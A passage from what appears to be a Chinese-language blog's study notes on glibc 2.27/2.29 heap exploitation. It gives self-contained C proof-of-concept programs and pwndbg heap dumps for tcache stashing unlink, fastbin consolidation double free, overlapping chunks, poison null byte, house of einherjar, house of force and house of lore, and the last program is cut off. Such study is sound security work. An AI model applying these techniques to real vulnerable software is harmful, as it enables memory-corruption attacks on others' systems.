Size: 0x20d91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再在栈上伪造一个堆，主要是伪造<code>size</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd20
0x7fffffffdd20:	0x000000000000000f	0x0000000000000040
0x7fffffffdd30:	0x00007fffffffdd98	0x00000000000000f0
0x7fffffffdd40:	0x00000000000000c2	0x00000000004013ad
0x7fffffffdd50:	0x00007ffff7de59a0	0x0000000000000000
0x7fffffffdd60:	0x0000000000401360	0x00000000004010f0
0x7fffffffdd70:	0x00007fffffffde60	0x00007fffffffdd30
0x7fffffffdd80:	0x0000000000401360	0x00007ffff7a05b97
0x7fffffffdd90:	0x0000000000000001	0x00007fffffffde68
0x7fffffffdda0:	0x000000010000c000	0x00000000004011d6
0x7fffffffddb0:	0x0000000000000000	0x762a1758ffbc0fb4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放之后再申请即可申请到这个位置实现任意地址读写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x40 [  1]: 0x7fffffffdd30 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
    unsigned long stack_var[0x10] &#x3D; &#123;0&#125;;
    unsigned long *chunk_lis[0x10] &#x3D; &#123;0&#125;;
    unsigned long *target;

    setbuf(stdout, NULL);

    stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);

    for(int i &#x3D; 0;i &lt; 9;i++)&#123;
        chunk_lis[i] &#x3D; (unsigned long*)malloc(0x90);
    &#125;

    for(int i &#x3D; 3;i &lt; 9;i++)&#123;
        free(chunk_lis[i]);
    &#125;

    free(chunk_lis[1]);
    free(chunk_lis[0]);
    free(chunk_lis[2]);
    
    malloc(0xa0);
    malloc(0x90);
    malloc(0x90);

    chunk_lis[2][1] &#x3D; (unsigned long)stack_var;
    calloc(1,0x90);

    target &#x3D; malloc(0x90);   

    assert(target &#x3D;&#x3D; &amp;stack_var[2]);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>该方法是<code>2.27</code>或<code>2.29</code>下用<code>calloc</code>创建堆时候针对<code>small bin</code>的攻击</p>
<p>创建<code>9</code>个大小属于<code>unsorted bin</code>的堆并全部释放</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405390
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比释放的堆大的堆使得释放的堆进入<code>small bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着从<code>tcache</code>取了两个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>small bin</code>的最后一个堆<code>fd</code>改成栈上的地址，即目标地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
BK: 0x405250 —▸ 0x405390 —▸ 0x7fffffffdcd0 —▸ 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于<code>calloc</code>不会从<code>tcache</code>中取堆，所以用<code>calloc</code>创建一个堆，<code>tcache</code>中有两个空位，此时<code>small bin</code>中的堆会进入<code>tcache</code>，再次用<code>malloc</code>申请即可得到篡改的栈地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0xa0 [  7]: 0x7fffffffdce0 —▸ 0x4053a0 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x405390 —▸ 0x4056c0 ◂— 0x0
BK: 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

void main() &#123;
	void *ptr[7];

	for(int i &#x3D; 0; i &lt; 7; i++)
		ptr[i] &#x3D; malloc(0x40);
	for(int i &#x3D; 0; i &lt; 7; i++)
		free(ptr[i]);

	void* p1 &#x3D; calloc(1,0x40);
  	free(p1);

  	void* p3 &#x3D; malloc(0x400);
	assert(p1 &#x3D;&#x3D; p3);

	free(p1);
	void *p4 &#x3D; malloc(0x400);
	assert(p4 &#x3D;&#x3D; p3);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用了<code>double free</code>和<code>calloc</code>不会从<code>tcache</code>取堆的原理</p>
<p>填满<code>tcache</code>再释放一个堆到<code>fast bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x405890 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个属于<code>small bin</code>的堆然后再次释放<code>fast bin</code>里的堆，此时<code>fast bin</code>中的堆被和那个大于<code>small bin</code>的堆合并了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
0x410 [  1]: 0x4058a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请出合并的堆即可申请到那个大的堆了且它并没有被释放</p>
<h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main(int argc , char* argv[])
&#123;
	setbuf(stdout, NULL);

	intptr_t *p1,*p2,*p3,*p4;
    
	p1 &#x3D; malloc(0x500 - 8);
	p2 &#x3D; malloc(0x500 - 8);
	p3 &#x3D; malloc(0x80 - 8);

	memset(p1, &#39;1&#39;, 0x500 - 8);
	memset(p2, &#39;2&#39;, 0x500 - 8);
	memset(p3, &#39;3&#39;, 0x80 - 8);

	free(p2);

	int evil_chunk_size &#x3D; 0x581;
	int evil_region_size &#x3D; 0x580 - 8;
    
	*(p2-1) &#x3D; evil_chunk_size; 
    
	p4 &#x3D; malloc(evil_region_size);

	memset(p4, &#39;4&#39;, evil_region_size);
	memset(p3, &#39;3&#39;, 80);

	assert(strstr((char *)p4, (char *)p3));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请三个堆（前两个堆大于<code>tcache</code>)，利用第一个堆去修改第二个堆的内容，释放第二个堆进入<code>unsorted bin</code>之后改第二个堆的<code>size</code>为第二个堆和第三个堆的大小之和，再去创建这个大小的堆即可利用这个堆去覆写第三个堆而第三个堆仍然存在</p>
<p>先创建三个堆，并释放第二个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x501

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405750
Size: 0x501
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x405c50
Size: 0x80

Top chunk | PREV_INUSE
Addr: 0x405cd0
Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>size</code>位使其覆盖下一个堆，此时已经看到第二个堆包含了第三个堆，再去创建出这个堆即可实现对第三个对的<code>overlap</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x501

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405750
Size: 0x581
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Top chunk | PREV_INUSE
Addr: 0x405cd0
Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>

	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
    <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
	b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code>,只要堆大小在<code>tcache</code>之上即可</p>
<h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;

int main()&#123;

	int* ptr1 &#x3D; malloc(0x10); 

	long long* top_ptr &#x3D; malloc(0x100000);
	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
    
	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
    
	free(mmap_chunk_3); 

	long long* overlapping_chunk &#x3D; malloc(0x300000);
    
	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
	overlapping_chunk[distance] &#x3D; 0x1122334455667788;

	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code></p>
<h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a &#x3D; (uint8_t*) malloc(0x38);
	int real_a_size &#x3D; malloc_usable_size(a);

	size_t fake_chunk[6];

	fake_chunk[0] &#x3D; 0x100;
	fake_chunk[1] &#x3D; 0x100;
	fake_chunk[2] &#x3D; (size_t) fake_chunk; 
	fake_chunk[3] &#x3D; (size_t) fake_chunk; 
	fake_chunk[4] &#x3D; (size_t) fake_chunk; 
	fake_chunk[5] &#x3D; (size_t) fake_chunk; 

	b &#x3D; (uint8_t*) malloc(0x4f8);
	int real_b_size &#x3D; malloc_usable_size(b);
	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
    
	a[real_a_size] &#x3D; 0; 
	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;

	fake_chunk[1] &#x3D; fake_size;

	free(b);
	d &#x3D; malloc(0x200);

	assert((long)d &#x3D;&#x3D; (long)&amp;fake_chunk[2]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先创建两个堆和一个伪造的堆,第一个堆的大小要是<code>0x?8</code>用来溢出到下一个堆的<code>size</code>位实现<code>off-by-null</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x501

Top chunk | PREV_INUSE
Addr: 0x405790
Size: 0x20871<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
0x7fffffffdd10:	0x0000000000000100	0x0000000000000100		#prve_size    size
0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10		#fd           bk
0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10		#fd_nextsize  bknextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>inuse</code>为<code>0</code>,即表示上一个堆已经释放，再伪造<code>fake_chunk</code>的大小和第二个堆的<code>size</code>,绕过<code>prve_size == fd-&gt;size</code>的检查</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x41

Allocated chunk
Addr: 0x405290
Size: 0x500

Top chunk | PREV_INUSE
Addr: 0x405790
Size: 0x20871

pwndbg&gt; x&#x2F;20gx 0x405290
0x405290:	0xffff800000407580	0x0000000000000500
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000
0x4052f0:	0x0000000000000000	0x0000000000000000
0x405300:	0x0000000000000000	0x0000000000000000
0x405310:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
0x7fffffffdd10:	0x0000000000000100	0xffff800000407580
0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10
0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放掉之后<code>fake_chunk</code>会和第二个堆合并，再次申请即可得到<code>fake_chunk</code>的地址</p>
<h3 id="house-of-force-top-chunk"><a href="#house-of-force-top-chunk" class="headerlink" title="house_of_force(top chunk)"></a>house_of_force(top chunk)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
&#123;
	intptr_t *p1 &#x3D; malloc(256);
	int real_size &#x3D; malloc_usable_size(p1);
    
	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;
	
	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;	
	void *new_ptr &#x3D; malloc(evil_size);	

	void* ctr_chunk &#x3D; malloc(100);
	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);

	assert(ctr_chunk &#x3D;&#x3D; bss_var);

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code></p>
<h3 id="house-of-lore-small-bin"><a href="#house-of-lore-small-bin" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;

int main(int argc, char * argv[])&#123;
  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;
  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;
    
  void* fake_freelist[7][4];    
  intptr_t *victim &#x3D; malloc(0x100);
  void *dummies[7];
    
  for(int i&#x3D;0; i&lt;7; i++) dummies[i] &#x3D; malloc(0x100);

  intptr_t *victim_chunk &#x3D; victim-2;

  for(int i&#x3D;0; i&lt;6; i++) &#123;
    fake_freelist[i][3] &#x3D; fake_freelist[i+1];
  &#125;
    
  fake_freelist[6][3] &#x3D; NULL;
    
  stack_buffer_1[0] &#x3D; 0;
  stack_buffer_1[1] &#x3D; 0;
  stack_buffer_1[2] &#x3D; victim_chunk;
  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;
  stack_buffer_2[3] &#x3D; (intptr_t *)fake_freelist[0];
  
  void *p5 &#x3D; malloc(1000);
  for(int i&#x3D;0; i&lt;7; i++) free(dummies[i]);
  free((void*)victim);

  void *p2 &#x3D; malloc(1200);
  victim[1] &#x3D; (intptr_t)stack_buffer_1; 
  for(int i&#x3D;0; i&lt;7; i++) malloc(0x100);

  void *p3 &#x3D; malloc(0x100);
  char *p4 &#x3D; malloc(0x100);
    
